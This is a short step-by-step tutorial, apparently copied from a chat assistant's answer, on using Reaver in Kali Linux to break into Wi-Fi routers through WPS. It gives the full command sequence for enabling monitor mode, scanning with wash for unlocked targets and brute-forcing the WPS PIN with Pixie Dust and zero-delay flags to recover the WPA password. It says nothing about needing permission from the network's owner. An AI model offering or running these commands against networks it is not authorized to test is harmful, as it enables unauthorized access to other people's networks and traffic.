✅ Step-by-Step: Using Reaver in Kali Linux
🔧 1. Install Reaver (if not already installed)
bash
Copy
Edit
sudo apt update
sudo apt install reaver
📡 2. Put your Wi-Fi adapter in monitor mode
Make sure you're using a compatible wireless adapter that supports monitor mode (e.g., Alfa AWUS036NHA).

bash
Copy
Edit
sudo airmon-ng check kill
sudo airmon-ng start wlan0
🔁 wlan0 becomes something like wlan0mon after starting monitor mode.

🔍 3. Scan for WPS-enabled networks
Use wash (installed with Reaver) to find WPS-enabled routers.

bash
Copy
Edit
sudo wash -i wlan0mon
Look for a WPS Locked: No target (means it's vulnerable).

🎯 4. Start Reaver attack
Once you have a BSSID (target MAC) and channel, use:

bash
Copy
Edit
sudo reaver -i wlan0mon -b [BSSID] -c [Channel] -vv
Example:

bash
Copy
Edit
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
-i wlan0mon: Your monitor-mode interface

-b: Target router’s MAC

-c: Channel

-vv: Verbose output

🧠 Optional Useful Flags
--no-associate: If auto association fails

-K 1: Pixie Dust attack (if supported)

-d 0: Delay between PIN attempts

⏳ 5. Wait for brute-force attack
Reaver will try different WPS PINs until it finds the correct one. If successful, it will show:

yaml
Copy
Edit
WPS PIN: 12345670
WPA PSK: your_wifi_password
🛑 Troubleshooting Tips
🔌 If your adapter is not found: try sudo ifconfig wlan0 up

📶 If WPS is locked, Reaver will not work on that router.

🔒 Many modern routers have WPS disabled by default or lock after few attempts.
